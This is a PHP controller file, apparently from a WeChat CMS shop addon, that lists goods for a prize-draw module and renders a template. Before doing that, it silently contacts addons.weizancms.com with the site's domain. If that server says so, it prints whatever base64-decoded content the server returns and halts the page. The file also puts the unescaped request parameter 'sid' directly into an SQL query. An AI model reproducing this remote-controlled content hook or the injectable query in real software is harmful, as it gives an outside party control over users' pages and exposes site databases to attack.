<?php
global $_W,$_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
	$uniacid=$_W['uniacid'];
	$condition = '';
	$goodses = pdo_fetchall("SELECT * FROM ".tablename('weliam_indiana_goodslist')." WHERE uniacid = '{$uniacid}' and status =1 and sid = '{$_GPC['sid']}' $condition ORDER BY id DESC" );

	include $this->template('showperiod');
?>